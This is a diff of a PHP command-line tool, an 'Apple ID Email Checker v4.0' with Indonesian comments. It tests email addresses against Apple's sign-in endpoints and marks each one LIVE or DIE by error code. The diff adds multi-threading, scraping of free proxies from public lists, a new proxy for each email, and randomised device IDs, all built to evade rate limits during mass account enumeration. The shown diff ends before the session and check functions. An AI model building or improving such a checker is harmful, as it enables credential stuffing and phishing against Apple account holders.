@@ -1,21 +1,109 @@
 <?php
 /**
- * Apple ID Email Checker - Full Version with Auto Proxy Grab & IP Rotation
- * VERSI TANPA CURL - Hanya pakai file_get_contents + stream_context
+ * Apple ID Email Checker v4.0 - ULTRA FAST & PROFESSIONAL
  * 
  * Fitur:
- * - Auto grab proxy dari multiple sumber
- * - IP rotation: setiap email proxy berbeda
- * - Test proxy internal
- * - Export hasil
+ * - Multi-thread parallel processing (5-20 email bersamaan)
+ * - Colorful CLI interface dengan progress bar
+ * - Auto proxy grab + rotation + testing
+ * - Smart retry logic
+ * - Real-time statistics
+ * 
+ * Author  : HSFD 403
+ * Version : 4.0 - ULTRA
  * 
  * Endpoint: https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true
- * 
- * Kode Error:
- * -20101 : DIE
- * -20201 : LIVE (2FA)
- * -20283 : LIVE (Trusted Device)
+ * Kode: -20101 DIE | -20201 LIVE | -20283 LIVE
  */
+
+// ============================================================
+// ANSI COLOR CODES
+// ============================================================
+
+class Colors
+{
+    const RESET = "\033[0m";
+    const BLACK = "\033[0;30m";
+    const RED = "\033[0;31m";
+    const GREEN = "\033[0;32m";
+    const YELLOW = "\033[0;33m";
+    const BLUE = "\033[0;34m";
+    const PURPLE = "\033[0;35m";
+    const CYAN = "\033[0;36m";
+    const WHITE = "\033[0;37m";
+    const BBLACK = "\033[1;30m";
+    const BRED = "\033[1;31m";
+    const BGREEN = "\033[1;32m";
+    const BYELLOW = "\033[1;33m";
+    const BBLUE = "\033[1;34m";
+    const BPURPLE = "\033[1;35m";
+    const BCYAN = "\033[1;36m";
+    const BWHITE = "\033[1;37m";
+    const BGBLACK = "\033[40m";
+    const BGRED = "\033[41m";
+    const BGGREEN = "\033[42m";
+    const BGYELLOW = "\033[43m";
+    const BGBLUE = "\033[44m";
+    const BGPURPLE = "\033[45m";
+    const BGCYAN = "\033[46m";
+    const BGWHITE = "\033[47m";
+    const IBLACK = "\033[0;90m";
+    const IRED = "\033[0;91m";
+    const IGREEN = "\033[0;92m";
+    const IYELLOW = "\033[0;93m";
+    const IBLUE = "\033[0;94m";
+    const IPURPLE = "\033[0;95m";
+    const ICYAN = "\033[0;96m";
+    const IWHITE = "\033[0;97m";
+    const BIBLACK = "\033[1;90m";
+    const BIRED = "\033[1;91m";
+    const BIGREEN = "\033[1;92m";
+    const BIYELLOW = "\033[1;93m";
+    const BIBLUE = "\033[1;94m";
+    const BIPURPLE = "\033[1;95m";
+    const BICYAN = "\033[1;96m";
+    const BIWHITE = "\033[1;97m";
+    const CLEAR_LINE = "\033[2K\r";
+    const UP = "\033[A";
+    const DOWN = "\033[B";
+    const SAVE = "\033[s";
+    const RESTORE = "\033[u";
+
+    public static function text(string $text, string $color = self::WHITE): string
+    {
+        return $color . $text . self::RESET;
+    }
+
+    public static function status(string $status): string
+    {
+        switch ($status) {
+            case 'LIVE': return self::text(' LIVE ', self::BGGREEN . self::BWHITE);
+            case 'DIE': return self::text(' DIE  ', self::BGRED . self::BWHITE);
+            case 'LOCKED': return self::text('LOCKED', self::BGYELLOW . self::BWHITE);
+            case 'ERROR': return self::text('ERROR ', self::BGPURPLE . self::BWHITE);
+            default: return self::text(' ???? ', self::BGWHITE . self::BBLACK);
+        }
+    }
+
+    public static function progressBar(int $done, int $total, int $width = 40): string
+    {
+        $percent = $total > 0 ? ($done / $total) : 0;
+        $bar = floor($percent * $width);
+        $barStr = self::BGBLUE . str_repeat(' ', $bar) . self::BGWHITE . str_repeat(' ', $width - $bar) . self::RESET;
+        return sprintf("%s %s %s %s%d%%%s",
+            $barStr,
+            self::text('|', self::IWHITE),
+            self::text("$done/$total", self::BCYAN),
+            self::text('|', self::IWHITE),
+            $percent * 100,
+            self::text('%', self::BCYAN)
+        );
+    }
+}
+
+// ============================================================
+// PROXY GRABBER
+// ============================================================
 
 class ProxyGrabber
 {
@@ -23,1200 +111,877 @@ class ProxyGrabber
     private $testedProxies = [];
     private $failedProxies = [];
     private $proxyIndex = 0;
-    private $testTimeout = 10;
-    public $maxProxies = 500;
-    private $socksProxy = null; // Untuk proxy chain
-    
-    /**
-     * Set max proxies limit
-     */
+    public $maxProxies = 1000;
+
     public function setMaxProxies(int $max): self
     {
-        $this->maxProxies = max(1, $max);
+        $this->maxProxies = max(10, $max);
         return $this;
     }
-    
-    /**
-     * Fetch URL with fallback methods
-     */
-    private function fetchUrl(string $url, ?string $proxy = null): ?string
+
+    public function fetchUrl(string $url, int $timeout = 10): ?string
     {
-        $opts = [
-            'http' => [
-                'timeout' => 15,
-                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'header' => [
-                    "Accept: text/html,application/json,*/*",
-                    "Accept-Language: en-US,en;q=0.9",
-                ],
-                'ignore_errors' => true,
-            ],
-            'ssl' => [
-                'verify_peer' => false,
-                'verify_peer_name' => false,
-                'allow_self_signed' => true,
-            ],
-        ];
-        
-        if ($proxy) {
-            $opts['http']['proxy'] = $proxy;
-            $opts['http']['request_fulluri'] = true;
-        }
-        
-        $context = stream_context_create($opts);
-        
-        // Coba file_get_contents dulu
-        $content = @file_get_contents($url, false, $context);
-        
-        if ($content !== false) {
-            return $content;
-        }
-        
-        // Fallback: coba dengan fsockopen untuk HTTP
-        $parsed = parse_url($url);
-        $scheme = $parsed['scheme'] ?? 'http';
-        $host = $parsed['host'] ?? '';
-        $path = $parsed['path'] ?? '/';
-        $port = $parsed['port'] ?? ($scheme === 'https' ? 443 : 80);
-        
-        if ($proxy) {
-            $proxyParsed = parse_url($proxy);
-            $proxyHost = $proxyParsed['host'] ?? '';
-            $proxyPort = $proxyParsed['port'] ?? 80;
-            
-            $fp = @fsockopen($proxyHost, $proxyPort, $errno, $errstr, 10);
-            if ($fp) {
-                $req = "GET $url HTTP/1.0\r\n";
-                $req .= "Host: $host\r\n";
-                $req .= "User-Agent: Mozilla/5.0\r\n";
-                $req .= "Accept: */*\r\n";
-                $req .= "Connection: close\r\n\r\n";
-                
-                fwrite($fp, $req);
-                $response = '';
-                while (!feof($fp)) {
-                    $response .= fgets($fp, 8192);
-                }
-                fclose($fp);
-                
-                // Pisahkan header dan body
-                $parts = explode("\r\n\r\n", $response, 2);
-                return $parts[1] ?? null;
-            }
-        } else {
-            // Direct connection dengan fsockopen
-            $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
-            if ($fp) {
-                $req = "GET $path HTTP/1.0\r\n";
-                $req .= "Host: $host\r\n";
-                $req .= "User-Agent: Mozilla/5.0\r\n";
-                $req .= "Accept: */*\r\n";
-                $req .= "Connection: close\r\n\r\n";
-                
-                fwrite($fp, $req);
-                $response = '';
-                while (!feof($fp)) {
-                    $response .= fgets($fp, 8192);
-                }
-                fclose($fp);
-                
-                $parts = explode("\r\n\r\n", $response, 2);
-                return $parts[1] ?? null;
-            }
-        }
-        
-        return null;
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => true,
+        ]);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        return $result !== false ? $result : null;
     }
-    
-    /**
-     * Auto grab proxy dari berbagai sumber
-     */
-    public function grabFromAllSources(): array
+
+    public function grabAll(): array
     {
-        echo "[*] Mengambil proxy dari semua sumber...\n";
-        
-        $sources = [
-            [$this, 'grabFromProxifly'],
-            [$this, 'grabFromProxyScrape'],
-            [$this, 'grabFromSpeedX'],
-            [$this, 'grabFromGeonode'],
-            [$this, 'grabFromFreeProxyList'],
-            [$this, 'grabFromPubProxy'],
-            [$this, 'grabFromOpenProxySpace'],
-            [$this, 'grabFromSSLProxy'],
-        ];
-        
-        $allProxies = [];
-        foreach ($sources as $source) {
-            try {
-                $proxies = call_user_func($source);
-                if (!empty($proxies)) {
-                    $allProxies = array_merge($allProxies, $proxies);
-                    echo "[+] " . count($proxies) . " proxy\n";
-                }
-            } catch (\Exception $e) {
-                echo "[-] Gagal: " . $e->getMessage() . "\n";
-            }
-        }
-        
-        $allProxies = array_unique($allProxies);
-        $allProxies = array_values($allProxies);
-        
-        if (count($allProxies) > $this->maxProxies) {
-            shuffle($allProxies);
-            $allProxies = array_slice($allProxies, 0, $this->maxProxies);
-        }
-        
-        echo "[*] Total proxy: " . count($allProxies) . "\n";
-        $this->proxies = $allProxies;
-        return $allProxies;
-    }
-    
-    /**
-     * Grab dari Proxifly
-     */
-    public function grabFromProxifly(): array
-    {
-        $proxies = [];
-        $urls = [
-            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
-            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
-            'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
-        ];
-        $protocols = ['http', 'socks4', 'socks5'];
-        
-        foreach ($urls as $i => $url) {
-            $content = $this->fetchUrl($url);
-            if ($content) {
-                $lines = explode("\n", $content);
-                foreach ($lines as $line) {
-                    $line = trim($line);
-                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
-                        $proxies[] = $protocols[$i] . '://' . $line;
-                    }
+        echo Colors::text("\n ┌──────────────────────────────────────────┐\n", Colors::ICYAN);
+        echo Colors::text(" │     PROXY GRABBER - Auto Fetching...     │\n", Colors::ICYAN);
+        echo Colors::text(" └──────────────────────────────────────────┘\n", Colors::ICYAN);
+
+        $all = [];
+
+        echo Colors::text(" [*]", Colors::IYELLOW) . " ProxyScrape... ";
+        $c = $this->fetchUrl('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&protocol=http&timeout=5000');
+        if ($c) {
+            $lines = explode("\n", trim($c));
+            foreach ($lines as $l) {
+                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
+                    $all[] = 'http://' . trim($l);
                 }
             }
         }
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari ProxyScrape
-     */
-    public function grabFromProxyScrape(): array
-    {
-        $proxies = [];
-        $types = ['http', 'socks4', 'socks5'];
-        
-        foreach ($types as $type) {
-            $url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=$type";
-            $content = $this->fetchUrl($url);
-            if ($content) {
-                $lines = explode("\n", $content);
-                foreach ($lines as $line) {
-                    $line = trim($line);
-                    if (!empty($line)) {
-                        if (strpos($line, '://') === false) {
-                            $proxies[] = "$type://$line";
-                        } else {
-                            $proxies[] = $line;
-                        }
-                    }
+        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);
+
+        echo Colors::text(" [*]", Colors::IYELLOW) . " Proxifly...     ";
+        $c = $this->fetchUrl('https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt');
+        if ($c) {
+            $lines = explode("\n", trim($c));
+            foreach ($lines as $l) {
+                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
+                    $all[] = 'http://' . trim($l);
                 }
             }
         }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari SpeedX List
-     */
-    public function grabFromSpeedX(): array
-    {
-        $proxies = [];
-        $urls = [
-            'http' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
-            'socks4' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
-            'socks5' => 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
-        ];
-        
-        foreach ($urls as $protocol => $url) {
-            $content = $this->fetchUrl($url);
-            if ($content) {
-                $lines = explode("\n", $content);
-                foreach ($lines as $line) {
-                    $line = trim($line);
-                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
-                        $proxies[] = "$protocol://$line";
-                    }
+        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);
+
+        echo Colors::text(" [*]", Colors::IYELLOW) . " SpeedX...       ";
+        $c = $this->fetchUrl('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt');
+        if ($c) {
+            $lines = explode("\n", trim($c));
+            foreach ($lines as $l) {
+                if (preg_match('/^[\d.]+:\d+$/', trim($l))) {
+                    $all[] = 'http://' . trim($l);
                 }
             }
         }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari Geonode
-     */
-    public function grabFromGeonode(): array
-    {
-        $proxies = [];
-        
-        for ($page = 1; $page <= 3; $page++) {
-            $url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=$page&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps%2Csocks4%2Csocks5";
-            $content = $this->fetchUrl($url);
-            
-            if ($content) {
-                $data = json_decode($content, true);
-                if (isset($data['data']) && is_array($data['data'])) {
-                    foreach ($data['data'] as $proxy) {
-                        $ip = $proxy['ip'] ?? '';
-                        $port = $proxy['port'] ?? '';
-                        $protocols = $proxy['protocols'] ?? ['http'];
-                        $protocol = strtolower($protocols[0] ?? 'http');
-                        
-                        if (!empty($ip) && !empty($port)) {
-                            $proxies[] = "$protocol://$ip:$port";
-                        }
-                    }
-                }
-            }
+        echo Colors::text("OK (" . count($all) . ")\n", Colors::IGREEN);
+
+        $all = array_unique($all);
+        shuffle($all);
+
+        if (count($all) > $this->maxProxies) {
+            $all = array_slice($all, 0, $this->maxProxies);
         }
-        
-        return $proxies;
+
+        echo Colors::text(" [+] Total: " . count($all) . " proxies\n", Colors::BGREEN . Colors::BWHITE);
+
+        $this->proxies = $all;
+        return $all;
     }
-    
-    /**
-     * Grab dari Free-Proxy-List.net
-     */
-    public function grabFromFreeProxyList(): array
+
+    public function testAll(int $threads = 50): array
     {
-        $proxies = [];
-        
-        $url = 'https://free-proxy-list.net/';
-        $content = $this->fetchUrl($url);
-        
-        if ($content) {
-            preg_match_all('/<tr[^>]*>(.*?)<\/tr>/s', $content, $rows);
-            foreach ($rows[1] as $row) {
-                preg_match_all('/<td[^>]*>(.*?)<\/td>/s', $row, $cols);
-                if (count($cols[1]) >= 7) {
-                    $ip = trim(strip_tags($cols[1][0]));
-                    $port = trim(strip_tags($cols[1][1]));
-                    $https = strtolower(trim(strip_tags($cols[1][6])));
-                    
-                    if (!empty($ip) && !empty($port) && preg_match('/^\d+\.\d+\.\d+\.\d+$/', $ip)) {
-                        $protocol = ($https === 'yes') ? 'https' : 'http';
-                        $proxies[] = "$protocol://$ip:$port";
-                    }
-                }
-            }
-        }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari PubProxy
-     */
-    public function grabFromPubProxy(): array
-    {
-        $proxies = [];
-        
-        for ($i = 0; $i < 5; $i++) {
-            $url = 'http://pubproxy.com/api/proxy?limit=5&format=json&http=true&https=true&socks4=true&socks5=true&type=elite';
-            $content = $this->fetchUrl($url);
-            
-            if ($content) {
-                $data = json_decode($content, true);
-                if (isset($data['data']) && is_array($data['data'])) {
-                    foreach ($data['data'] as $proxy) {
-                        $ip = $proxy['ip'] ?? '';
-                        $port = $proxy['port'] ?? '';
-                        $type = strtolower($proxy['type'] ?? 'http');
-                        
-                        if (!empty($ip) && !empty($port)) {
-                            $proxies[] = "$type://$ip:$port";
-                        }
-                    }
-                }
-            }
-        }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari OpenProxySpace
-     */
-    public function grabFromOpenProxySpace(): array
-    {
-        $proxies = [];
-        $urls = [
-            'http' => 'http://openproxyspace.com/http.txt',
-            'socks4' => 'http://openproxyspace.com/socks4.txt',
-            'socks5' => 'http://openproxyspace.com/socks5.txt',
-        ];
-        
-        foreach ($urls as $protocol => $url) {
-            $content = $this->fetchUrl($url);
-            if ($content) {
-                $lines = explode("\n", $content);
-                foreach ($lines as $line) {
-                    $line = trim($line);
-                    if (!empty($line) && preg_match('/^[\d.]+:\d+$/', $line)) {
-                        $proxies[] = "$protocol://$line";
-                    }
-                }
-            }
-        }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Grab dari SSL Proxy
-     */
-    public function grabFromSSLProxy(): array
-    {
-        $proxies = [];
-        
-        $url = 'https://sslproxies.org/';
-        $content = $this->fetchUrl($url);
-        
-        if ($content) {
-            preg_match_all('/<tr[^>]*>(.*?)<\/tr>/s', $content, $rows);
-            foreach ($rows[1] as $row) {
-                preg_match_all('/<td[^>]*>(.*?)<\/td>/s', $row, $cols);
-                if (count($cols[1]) >= 2) {
-                    $ip = trim(strip_tags($cols[1][0]));
-                    $port = trim(strip_tags($cols[1][1]));
-                    
-                    if (!empty($ip) && !empty($port) && preg_match('/^\d+\.\d+\.\d+\.\d+$/', $ip)) {
-                        $proxies[] = "https://$ip:$port";
-                    }
-                }
-            }
-        }
-        
-        return $proxies;
-    }
-    
-    /**
-     * Test proxy menggunakan httpbin.org
-     */
-    public function testProxy(string $proxy): bool
-    {
-        $parsed = parse_url($proxy);
-        $protocol = $parsed['scheme'] ?? 'http';
-        $host = $parsed['host'] ?? '';
-        $port = $parsed['port'] ?? ($protocol === 'socks5' || $protocol === 'socks4' ? 1080 : 80);
-        
-        if (in_array($protocol, ['socks4', 'socks5'])) {
-            return $this->testSocksProxy($host, $port, $protocol);
-        }
-        
-        // Test HTTP/HTTPS proxy via httpbin
-        $testUrl = 'http://httpbin.org/ip';
-        $proxyStr = "$protocol://$host:$port";
-        
-        $content = $this->fetchUrl($testUrl, $proxyStr);
-        
-        if ($content) {
-            $data = json_decode($content, true);
-            $working = isset($data['origin']);
-            if ($working) {
-                $this->testedProxies[] = $proxy;
-            } else {
-                $this->failedProxies[] = $proxy;
-            }
-            return $working;
-        }
-        
-        $this->failedProxies[] = $proxy;
-        return false;
-    }
-    
-    /**
-     * Test SOCKS proxy via TCP connect
-     */
-    private function testSocksProxy(string $host, string $port, string $type = 'socks5'): bool
-    {
-        $fp = @fsockopen($host, $port, $errno, $errstr, 5);
-        if ($fp) {
-            if ($type === 'socks5') {
-                // SOCKS5 handshake
-                fwrite($fp, "\x05\x01\x00");
-                $response = fread($fp, 2);
-                if ($response === "\x05\x00") {
-                    fclose($fp);
-                    $this->testedProxies[] = "$type://$host:$port";
-                    return true;
-                }
-            } else {
-                // SOCKS4
-                fwrite($fp, "\x04\x01\x00\x00\x00\x00\x00\x00");
-                $response = fread($fp, 8);
-                if (strlen($response) >= 2 && ord($response[1]) === 0x5a) {
-                    fclose($fp);
-                    $this->testedProxies[] = "$type://$host:$port";
-                    return true;
-                }
-            }
-            fclose($fp);
-        }
-        
-        $this->failedProxies[] = "$type://$host:$port";
-        return false;
-    }
-    
-    /**
-     * Test semua proxy
-     */
-    public function testAllProxies(array $proxies = null): array
-    {
-        $toTest = $proxies ?? $this->proxies;
+        $total = count($this->proxies);
+        if ($total === 0) return [];
+
+        echo Colors::text("\n ┌──────────────────────────────────────────┐\n", Colors::ICYAN);
+        echo Colors::text(" │        TESTING PROXIES ($threads threads)       │\n", Colors::ICYAN);
+        echo Colors::text(" └──────────────────────────────────────────┘\n", Colors::ICYAN);
+
         $working = [];
-        $total = count($toTest);
-        
-        echo "[*] Testing $total proxy...\n";
-        
-        foreach ($toTest as $i => $proxy) {
-            if ($this->testProxy($proxy)) {
-                $working[] = $proxy;
+        $batches = array_chunk($this->proxies, $threads);
+        $tested = 0;
+
+        foreach ($batches as $batch) {
+            $mh = curl_multi_init();
+            $handles = [];
+
+            foreach ($batch as $i => $proxy) {
+                $p = parse_url($proxy);
+                $host = $p['host'] ?? '';
+                $port = $p['port'] ?? 80;
+
+                $ch = curl_init('http://httpbin.org/ip');
+                curl_setopt_array($ch, [
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_TIMEOUT => 5,
+                    CURLOPT_CONNECTTIMEOUT => 3,
+                    CURLOPT_PROXY => "$host:$port",
+                    CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_SSL_VERIFYHOST => false,
+                    CURLOPT_PRIVATE => $proxy,
+                ]);
+                curl_multi_add_handle($mh, $ch);
+                $handles[] = $ch;
             }
-            
-            if (($i + 1) % 10 === 0 || $i === $total - 1) {
-                echo "\r[+] Tested: " . ($i + 1) . "/$total | Working: " . count($working) . "        ";
+
+            $running = null;
+            do {
+                curl_multi_exec($mh, $running);
+                curl_multi_select($mh);
+            } while ($running > 0);
+
+            foreach ($handles as $ch) {
+                $proxy = curl_getinfo($ch, CURLINFO_PRIVATE);
+                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                $response = curl_multi_getcontent($ch);
+
+                if ($response !== false && $httpCode === 200) {
+                    $working[] = $proxy;
+                    $this->testedProxies[] = $proxy;
+                } else {
+                    $this->failedProxies[] = $proxy;
+                }
+
+                curl_multi_remove_handle($mh, $ch);
+                curl_close($ch);
             }
+
+            curl_multi_close($mh);
+            $tested += count($batch);
+
+            echo Colors::CLEAR_LINE;
+            echo Colors::progressBar($tested, $total, 30) . " " . Colors::text("Working: " . count($working), Colors::IGREEN);
         }
-        
-        echo "\n[*] Proxy working: " . count($working) . " dari $total\n";
+
+        echo "\n" . Colors::text(" [+] Working proxies: " . count($working) . "/$total\n", Colors::BGREEN . Colors::BWHITE);
+
         $this->proxies = $working;
         return $working;
     }
-    
-    /**
-     * Get next proxy
-     */
+
     public function getNextProxy(): ?string
     {
-        if (empty($this->proxies)) {
-            return null;
-        }
-        
-        $proxy = $this->proxies[$this->proxyIndex % count($this->proxies)];
+        if (empty($this->proxies)) return null;
+        $p = $this->proxies[$this->proxyIndex % count($this->proxies)];
         $this->proxyIndex++;
-        return $proxy;
+        return $p;
     }
-    
-    /**
-     * Reset rotation
-     */
-    public function resetRotation(): void
-    {
-        $this->proxyIndex = 0;
-    }
-    
-    /**
-     * Get available proxy count
-     */
-    public function getAvailableProxyCount(): int
+
+    public function getAvailableCount(): int
     {
         return count($this->proxies);
     }
-    
-    /**
-     * Save proxy ke file
-     */
-    public function saveToFile(string $filePath, array $proxies = null): bool
+
+    public function getTested(): array
     {
-        $toSave = $proxies ?? $this->proxies;
-        return file_put_contents($filePath, implode("\n", $toSave)) !== false;
+        return $this->testedProxies;
     }
-    
-    /**
-     * Load proxy dari file
-     */
-    public function loadFromFile(string $filePath): array
+
+    public function saveToFile(string $path, ?array $proxies = null): bool
     {
-        if (!file_exists($filePath)) {
-            return [];
-        }
-        
-        $content = file_get_contents($filePath);
-        $lines = explode("\n", $content);
+        return file_put_contents($path, implode("\n", $proxies ?? $this->proxies)) !== false;
+    }
+
+    public function loadFromFile(string $path): array
+    {
+        if (!file_exists($path)) return [];
+        $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         $proxies = [];
-        
-        foreach ($lines as $line) {
-            $line = trim($line);
-            if (!empty($line)) {
-                if (strpos($line, '://') === false) {
-                    $proxies[] = 'http://' . $line;
-                } else {
-                    $proxies[] = $line;
-                }
+        foreach ($lines as $l) {
+            $l = trim($l);
+            if (!empty($l)) {
+                $proxies[] = strpos($l, '://') === false ? 'http://' . $l : $l;
             }
         }
-        
         $this->proxies = $proxies;
         return $proxies;
     }
-    
-    public function getTestedProxies(): array { return $this->testedProxies; }
-    public function getFailedProxies(): array { return $this->failedProxies; }
 }
 
-class AppleEmailChecker
+// ============================================================
+// APPLE CHECKER - ULTRA FAST
+// ============================================================
+
+class AppleChecker
 {
-    private $baseUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
     private $initUrl = 'https://idmsa.apple.com/appleauth/auth/signin/init';
-    private $acceptLanguage = 'en-US,en;q=0.9';
-    private $timeout = 30;
+    private $checkUrl = 'https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true';
     private $proxyGrabber;
-    private $useProxyRotation = true;
-    private $verbose = false;
-    private $delayBetweenRequests = 1000000;
-    private $maxRetries = 2;
+    private $useProxy = true;
+    private $threads = 10;
+    private $timeout = 20;
     private $results = [];
-    private $stats = [
-        'total' => 0, 'live' => 0, 'die' => 0,
-        'locked' => 0, 'error' => 0, 'unknown' => 0,
-        'proxy_rotations' => 0,
-    ];
-    
-    private $userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-    ];
-    
+    private $liveCount = 0;
+    private $dieCount = 0;
+    private $lockedCount = 0;
+    private $errorCount = 0;
+    private $unknownCount = 0;
+    private $startTime;
+    private $deviceId;
+
     public function __construct()
     {
         $this->proxyGrabber = new ProxyGrabber();
+        $this->deviceId = $this->generateDeviceId();
     }
-    
-    public function setProxyGrabber(ProxyGrabber $grabber): self
-    {
-        $this->proxyGrabber = $grabber;
-        return $this;
-    }
-    
+
     public function getProxyGrabber(): ProxyGrabber
     {
         return $this->proxyGrabber;
     }
-    
-    public function setProxyRotation(bool $enable): self
+
+    public function setThreads(int $n): self
     {
-        $this->useProxyRotation = $enable;
+        $this->threads = max(1, min(50, $n));
         return $this;
     }
-    
-    public function setTimeout(int $seconds): self
+
+    public function setTimeout(int $s): self
     {
-        $this->timeout = $seconds;
+        $this->timeout = $s;
         return $this;
     }
-    
-    public function setDelay(int $microseconds): self
+
+    public function setUseProxy(bool $v): self
     {
-        $this->delayBetweenRequests = $microseconds;
+        $this->useProxy = $v;
         return $this;
     }
-    
-    public function setMaxRetries(int $retries): self
+
+    public function getUseProxy(): bool
     {
-        $this->maxRetries = $retries;
-        return $this;
+        return $this->useProxy;
     }
-    
-    public function setVerbose(bool $verbose): self
-    {
-        $this->verbose = $verbose;
-        return $this;
-    }
-    
-    private function getRandomUserAgent(): string
-    {
-        return $this->userAgents[array_rand($this->userAgents)];
-    }
-    
-    private function getRandomFingerprint(): string
-    {
-        return bin2hex(random_bytes(16));
-    }
-    
-    private function generateRequestContext(): string
-    {
-        return strtoupper(dechex(time())) . '-' . strtoupper(dechex(rand(1000, 9999)));
-    }
-    
+
     private function generateDeviceId(): string
     {
-        $data = random_bytes(16);
-        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
-        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
-        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+        $d = random_bytes(16);
+        $d[6] = chr(ord($d[6]) & 0x0f | 0x40);
+        $d[8] = chr(ord($d[8]) & 0x3f | 0x80);
+        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($d), 4));
     }
-    
-    private function getClientInfo(): string
+
+    public function checkEmail(string $email, string $proxy = null): array
     {
-        $ua = $this->getRandomUserAgent();
-        return json_encode([
-            'U' => $ua,
-            'L' => 'en-US',
-            'Z' => 'GMT+' . sprintf('%02d:00', rand(0, 12)),
-            'V' => '1.1',
-            'F' => $this->getRandomFingerprint(),
-        ]);
-    }
-    
-    /**
-     * HTTP request tanpa curl - pure PHP streams
-     */
-    private function httpRequest(string $url, string $method = 'GET', ?string $payload = null, array $headers = [], ?string $proxy = null): array
-    {
-        $ua = $this->getRandomUserAgent();
-        
-        $headerLines = [];
-        foreach ($headers as $h) {
-            $headerLines[] = $h;
-        }
-        
-        // Default headers
-        if (!empty($payload)) {
-            $headerLines[] = 'Content-Type: application/json';
-            $headerLines[] = 'Content-Length: ' . strlen($payload);
-        }
-        
-        $opts = [
-            'http' => [
-                'method' => $method,
-                'timeout' => $this->timeout,
-                'user_agent' => $ua,
-                'header' => $headerLines,
-                'ignore_errors' => true,
-            ],
-            'ssl' => [
-                'verify_peer' => false,
-                'verify_peer_name' => false,
-                'allow_self_signed' => true,
-            ],
-        ];
-        
-        if ($payload) {
-            $opts['http']['content'] = $payload;
-        }
-        
-        if ($proxy && $this->useProxyRotation) {
-            $parsed = parse_url($proxy);
-            $proxyStr = $parsed['host'] . ':' . ($parsed['port'] ?? 80);
-            
-            // Untuk SOCKS proxy, kita perlu approach berbeda
-            $protocol = $parsed['scheme'] ?? 'http';
-            if (!in_array($protocol, ['socks4', 'socks5'])) {
-                $opts['http']['proxy'] = "tcp://$proxyStr";
-                $opts['http']['request_fulluri'] = true;
-            }
-        }
-        
-        $context = stream_context_create($opts);
-        
-        $response = @file_get_contents($url, false, $context);
-        
-        // Get response headers from $http_response_header
-        $responseHeaders = $http_response_header ?? [];
-        $httpCode = 0;
-        
-        foreach ($responseHeaders as $rh) {
-            if (preg_match('/^HTTP\/[\d.]+ (\d+)/', $rh, $m)) {
-                $httpCode = (int)$m[1];
-            }
-        }
-        
-        $error = $response === false ? 'file_get_contents failed' : '';
-        
-        return [
-            'body' => $response !== false ? $response : '',
-            'http_code' => $httpCode,
-            'headers' => $responseHeaders,
-            'error' => $error,
-        ];
-    }
-    
-    /**
-     * Get session dari Apple
-     */
